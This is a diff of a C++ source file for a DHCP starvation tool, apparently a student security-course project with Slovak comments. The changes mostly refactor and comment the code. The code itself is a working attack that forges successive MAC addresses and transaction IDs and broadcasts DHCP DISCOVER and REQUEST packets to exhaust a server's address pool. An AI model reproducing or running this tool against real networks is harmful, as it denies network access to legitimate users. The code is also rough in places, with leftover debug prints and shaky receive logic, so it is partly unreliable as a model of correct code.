@@ -1,6 +1,6 @@
 /**
- *	Program: PDS
- *	Author: Adam Bezak xbezak01
+ *	Program: PDS - DHCP Starvation
+ *	@author: Adam Bezak xbezak01
  */
 
 #include "pds-dhcpstarve.h"
@@ -13,7 +13,8 @@ int main(int argc, char **argv) {
  	bool isInterface = false;
  	string interface;
 
-	while ((ch = getopt(argc, argv, "i:")) != -1) { // kontrola argumentov
+ 	/* Kontrola argumentov */
+	while ((ch = getopt(argc, argv, "i:")) != -1) {
 		switch (ch) {
 			case 'i' :
 				interface = optarg;
@@ -31,6 +32,8 @@ int main(int argc, char **argv) {
 		exit(ERR_BADPARAMS);		
 	}
 	
+
+	/* Odchytenie SIG INT signalu */
 	struct sigaction sigIntHandler;
 
 	sigIntHandler.sa_handler = sigCatch;
@@ -39,6 +42,8 @@ int main(int argc, char **argv) {
 
 	sigaction(SIGINT, &sigIntHandler, NULL);
 
+
+	/* Pociatocna random mac adresa */
 	uint8_t mac[6];
 	mac[0] = 0x08;
 	mac[1] = 0x00;
@@ -47,6 +52,7 @@ int main(int argc, char **argv) {
 	mac[4] = 0x00;
 	mac[5] = 0x00;
 
+	/* Pociatocny random transaction id */
 	uint32_t xid = htonl(0x01010000);
 
 
@@ -75,7 +81,7 @@ int main(int argc, char **argv) {
 			delete dhcpDiscover;
 			delete dhcpOffer;
 			delete dhcpRequest;
-			return 0;
+			break;
 		}
 	  
 	    uint8_t dhcpServerId[4];
@@ -90,8 +96,6 @@ int main(int argc, char **argv) {
 	    sendRequestAndReceiveAck(dhcpRequest, &socket);	
     }
 
-
-
     if ((close(socket)) == -1)      // close the socket
 	err(1,"close() failed");
 	printf("Closing socket ...\n");
@@ -100,57 +104,40 @@ int main(int argc, char **argv) {
 }
 
 void configureSocket(int *sock, string interface) {
-	struct sockaddr_in   addr, addr2;   // address data structure
-	int on = 1;                  // socket option
+	struct sockaddr_in   addrIn;   // Datova struktura adries
+	int on = 1; // socket option
 
-	memset(&addr,0,sizeof(addr));
-	addr.sin_family=AF_INET;
-	addr.sin_addr.s_addr=inet_addr("0.0.0.0");  // set the broadcast address
-	addr.sin_port=htons(68);       // set the broadcast port
+	memset(&addrIn,0,sizeof(addrIn));
+	addrIn.sin_family=AF_INET;
+	addrIn.sin_addr.s_addr=inet_addr("0.0.0.0");
+	addrIn.sin_port=htons(68);
 
-	memset(&addr2,0,sizeof(addr2));
-	addr2.sin_family=AF_INET;
-	addr2.sin_addr.s_addr=inet_addr("255.255.255.255");  // set the broadcast address
-	addr2.sin_port=htons(67);       // set the broadcast port
-
+	/* Vytvorenie socketu */
 	if ((*sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
 	err(1,"socket failed()");
 
+	/* Povolenie reusovania lokalnych adries na porte */
 	if ((setsockopt(*sock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on))) == -1)
 	err(1,"setsockopt failead()");
 
+	/* Povolenie odosielania broadcastu socketom */
 	if ((setsockopt(*sock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on))) == -1)
 	err(1,"setsockopt failebd()");
 
+	/* Povolenie pozuivat viacero portov na jednom sockete */
 	if ((setsockopt(*sock, SOL_SOCKET, SO_REUSEPORT, &on, sizeof(on))) == -1)
 	err(1,"setsockopt failecd()");
 
+	/* Nabinovanie socketu na rozhranie */
 	if ((setsockopt(*sock, SOL_SOCKET, SO_BINDTODEVICE, interface.c_str(), interface.length())) == -1)
 	err(1,"setsockopt failedd()");
 
-	if ((::bind(*sock, (struct sockaddr *) &addr, sizeof(addr))) < 0) {
+	if ((::bind(*sock, (struct sockaddr *) &addrIn, sizeof(addrIn))) < 0) {
 		if ((close(*sock)) == -1)      // close the socket
 		err(1,"close() failed");
-		printf("Closing socket ...\n");
-		err(1,"faiffl");
+		err(1,"fail");
 	}
 }
-
-// int getMacAddress(string interface, uint8_t *mac) {
-//   struct ifreq s;
-//   int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
-
-//   strcpy(s.ifr_name, "eth0");
-//   if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
-//   	memcpy((void *)mac, s.ifr_addr.sa_data, 6);
-//     int i;
-//     for (i = 0; i < 6; ++i)
-//       printf(" %02x", (unsigned char) s.ifr_addr.sa_data[i]);
-//     puts("\n");
-//     return 0;
-//   }
-//   return 1;
-// }
 
 void makeDiscover(dhcp_t *dhcpDiscover, uint8_t mac[], uint32_t *xid) {
     dhcpDiscover->opcode = 1;
@@ -164,66 +151,56 @@ void makeDiscover(dhcp_t *dhcpDiscover, uint8_t mac[], uint32_t *xid) {
     dhcpDiscover->yiaddr = 0;
     dhcpDiscover->siaddr = 0;
     dhcpDiscover->giaddr = 0;
-    memcpy(dhcpDiscover->chaddr, mac, 16);
-    printf("\n %d \n", sizeof(mac));
+    memcpy(dhcpDiscover->chaddr, mac, DHCP_CHADDR_LEN);
 
     dhcpDiscover->magic_cookie = htonl(0x63825363);
    	
    	uint8_t option = DHCP_OPTION_DISCOVER;
-   	fill_dhcp_option(&dhcpDiscover->bp_options[0], MESSAGE_TYPE_DHCP, &option, sizeof(option));
+   	fillDhcpOptions(&dhcpDiscover->bp_options[0], MESSAGE_TYPE_DHCP, &option, sizeof(option));
 
    	uint32_t req_ip = htonl(0xc0a8010a);
-   	fill_dhcp_option(&dhcpDiscover->bp_options[3], MESSAGE_TYPE_REQ_IP, (u_int8_t *)&req_ip, sizeof(req_ip));
+   	fillDhcpOptions(&dhcpDiscover->bp_options[3], MESSAGE_TYPE_REQ_IP, (u_int8_t *)&req_ip, sizeof(req_ip));
 
    	uint8_t parameter_req_list[] = {MESSAGE_TYPE_REQ_SUBNET_MASK, MESSAGE_TYPE_ROUTER, MESSAGE_TYPE_DOMAIN_NAME, MESSAGE_TYPE_DNS};
-   	fill_dhcp_option(&dhcpDiscover->bp_options[9], MESSAGE_TYPE_PARAMETER_REQ_LIST, (u_int8_t *)&parameter_req_list, sizeof(parameter_req_list));
+   	fillDhcpOptions(&dhcpDiscover->bp_options[9], MESSAGE_TYPE_PARAMETER_REQ_LIST, (u_int8_t *)&parameter_req_list, sizeof(parameter_req_list));
 
    	option = 0;
-   	fill_dhcp_option(&dhcpDiscover->bp_options[15], MESSAGE_TYPE_END, &option, 0);
-}
-
-void fill_dhcp_option(u_int8_t *packet, u_int8_t code, u_int8_t *data, u_int8_t len) {
-    packet[0] = code;
-    packet[1] = len;
-    memcpy(&packet[2], data, len);
+   	fillDhcpOptions(&dhcpDiscover->bp_options[15], MESSAGE_TYPE_END, &option, 0);
 }
 
 dhcp_t sendDiscoverAndReceiveOffer(dhcp_t *dhcpDiscover, int *socket) {
 	int n;
-	struct sockaddr_in   addr, addr2;   // address data structure
+	struct sockaddr_in   addrIn, addrOut;
 	socklen_t addrlen;
 
-	memset(&addr,0,sizeof(addr));
-	addr.sin_family=AF_INET;
-	addr.sin_addr.s_addr=inet_addr("0.0.0.0");  // set the broadcast address
-	addr.sin_port=htons(68);       // set the broadcast port
+	memset(&addrIn,0,sizeof(addrIn));
+	addrIn.sin_family=AF_INET;
+	addrIn.sin_addr.s_addr=inet_addr("0.0.0.0");
+	addrIn.sin_port=htons(68);
 
-	memset(&addr2,0,sizeof(addr2));
-	addr2.sin_family=AF_INET;
-	addr2.sin_addr.s_addr=inet_addr("255.255.255.255");  // set the broadcast address
-	addr2.sin_port=htons(67);       // set the broadcast port
+	memset(&addrOut,0,sizeof(addrOut));
+	addrOut.sin_family=AF_INET;
+	addrOut.sin_addr.s_addr=inet_addr("255.255.255.255");
+	addrOut.sin_port=htons(67);
 
-	if (sendto(*socket, dhcpDiscover, sizeof(dhcp),0, (struct sockaddr *) &addr2, sizeof(addr2)) < 0)
+	/* Odoslanie struktury na dany socket */
+	if (sendto(*socket, dhcpDiscover, sizeof(dhcp),0, (struct sockaddr *) &addrOut, sizeof(addrOut)) < 0)
 		err(1,"sendto");
 
 	dhcp_t *dhcpOffer = new dhcp;
-	 // read data from the multicast socket and print them on stdout until "END." is received
 
-	while ((n= recvfrom(*socket, dhcpOffer, sizeof(dhcp), 0, (struct sockaddr *) &addr, &addrlen)) >= 0) {
+	/* Citanie dat zo socketu */
+	while ((n= recvfrom(*socket, dhcpOffer, sizeof(dhcp), 0, (struct sockaddr *) &addrIn, &addrlen)) >= 0) {
 		if (flag) {
 			return *dhcpOffer;
 		}
 	}
 
-	if (dhcpOffer->bp_options[2] == (uint8_t)02) {
+	if (dhcpOffer->bp_options[2] == (uint8_t)DHCP_OPTION_OFFER) {
 		printf("DHCP OFFER received\n");
     	printf("%s\n", inet_ntoa(*(struct in_addr *)&dhcpOffer->yiaddr));
 		return *dhcpOffer;
 	}
-
-	// if ((close(*socket)) == -1)      // close the socket
-	// err(1,"close() failed");
-	// printf("Closing socket ...\n");
 }
 
 void makeRequest(dhcp_t *dhcpRequest, uint8_t mac[], uint8_t dhcpServerId[], uint32_t *xid, uint32_t *offeredIp) {
@@ -239,56 +216,64 @@ void makeRequest(dhcp_t *dhcpRequest, uint8_t mac[], uint8_t dhcpServerId[], uin
     dhcpRequest->siaddr = 0;
     dhcpRequest->giaddr = 0;
 
-    memcpy(dhcpRequest->chaddr, mac, 16);
+    memcpy(dhcpRequest->chaddr, mac, DHCP_CHADDR_LEN);
     dhcpRequest->magic_cookie = htonl(0x63825363);
    	printf("%s\n", inet_ntoa(*(struct in_addr *)offeredIp));
    	uint8_t option = DHCP_OPTION_REQUEST;
-   	fill_dhcp_option(&dhcpRequest->bp_options[0], MESSAGE_TYPE_DHCP, &option, sizeof(option));
-   	fill_dhcp_option(&dhcpRequest->bp_options[3], MESSAGE_TYPE_REQ_IP, (u_int8_t *)offeredIp, sizeof(uint32_t));
+   	fillDhcpOptions(&dhcpRequest->bp_options[0], MESSAGE_TYPE_DHCP, &option, sizeof(option));
+   	fillDhcpOptions(&dhcpRequest->bp_options[3], MESSAGE_TYPE_REQ_IP, (u_int8_t *)offeredIp, sizeof(uint32_t));
 
    	dhcpRequest->bp_options[9] = 0x36;
    	dhcpRequest->bp_options[10] = 0x4;
    	memcpy(&dhcpRequest->bp_options[11], dhcpServerId, sizeof(uint32_t));
 	
 	option = 0;
-   	fill_dhcp_option(&dhcpRequest->bp_options[19], MESSAGE_TYPE_END, &option, 0);
+   	fillDhcpOptions(&dhcpRequest->bp_options[19], MESSAGE_TYPE_END, &option, 0);
 }
 
 void sendRequestAndReceiveAck(dhcp_t *dhcpRequest, int *socket) {
 	int n;
-	struct sockaddr_in   addr, addr2;   // address data structure
+	struct sockaddr_in   addrIn, addrOut;
 	socklen_t addrlen;
 
-	memset(&addr,0,sizeof(addr));
-	addr.sin_family=AF_INET;
-	addr.sin_addr.s_addr=inet_addr("0.0.0.0");  // set the broadcast address
-	addr.sin_port=htons(68);       // set the broadcast port
+	memset(&addrIn,0,sizeof(addrIn));
+	addrIn.sin_family=AF_INET;
+	addrIn.sin_addr.s_addr=inet_addr("0.0.0.0");
+	addrIn.sin_port=htons(68);
 
-	memset(&addr2,0,sizeof(addr2));
-	addr2.sin_family=AF_INET;
-	addr2.sin_addr.s_addr=inet_addr("255.255.255.255");  // set the broadcast address
-	addr2.sin_port=htons(67);       // set the broadcast port
+	memset(&addrOut,0,sizeof(addrOut));
+	addrOut.sin_family=AF_INET;
+	addrOut.sin_addr.s_addr=inet_addr("255.255.255.255");
+	addrOut.sin_port=htons(67);
 
-	if (sendto(*socket, dhcpRequest, sizeof(dhcp),0, (struct sockaddr *) &addr2, sizeof(addr2)) < 0)
+	/* Odoslanie struktury na dany socket */
+	if (sendto(*socket, dhcpRequest, sizeof(dhcp),0, (struct sockaddr *) &addrOut, sizeof(addrOut)) < 0)
 		err(1,"sendto");
 
 	dhcp_t *dhcpAck = new dhcp;
-	 // read data from the multicast socket and print them on stdout until "END." is received
 
-	while ((n= recvfrom(*socket, dhcpAck, sizeof(dhcp), 0, (struct sockaddr *) &addr, &addrlen)) >= 0) {
+	/* Citanie dat zo socketu */
+	while ((n= recvfrom(*socket, dhcpAck, sizeof(dhcp), 0, (struct sockaddr *) &addrIn, &addrlen)) >= 0) {
 		if (flag) {
 			cout << "som tu" << flush;
 			return;
 		}
 	}
-	if (dhcpAck->bp_options[2] == (uint8_t)05) {
-		cout << "som tu" << flush;
+	if (dhcpAck->bp_options[2] == (uint8_t)DHCP_OPTION_ACK) {
 		printf("DHCP ACK received\n");
 		return;
 	}
 }
 
-void getMacAddress(uint8_t *mac, uint32_t *xid) {
+void fillDhcpOptions(uint8_t *packetOptionPart, uint8_t code, uint8_t *data, u_int8_t len) {
+    packetOptionPart[0] = code;
+    packetOptionPart[1] = len;
+    memcpy(&packetOptionPart[2], data, len);
+}
+
+void getMacAddress(uint8_t mac[], uint32_t *xid) {
+
+	/* Generovanie novej MAC adresy */
 	if (mac[5] < (uint8_t)0xFF) {
 		mac[5] = mac[5] + 1;
 	} else if (mac[4] < (uint8_t)0xFF) {
@@ -297,8 +282,8 @@ void getMacAddress(uint8_t *mac, uint32_t *xid) {
 		mac[3] = mac[3] + 1;
 	}
 
+	/* Inkement transaction id */
 	*xid = *xid + 1;
-	// int result = getMacAddress(interface, mac);
 }
 
 void sigCatch(int sig) {
@@ -307,6 +292,6 @@ void sigCatch(int sig) {
 }
 
 void print_error(int err) {
-	cerr << errors[err] << endl;		//vypis na stderr
+	cerr << errors[err] << endl;
 	exit(err);
 }
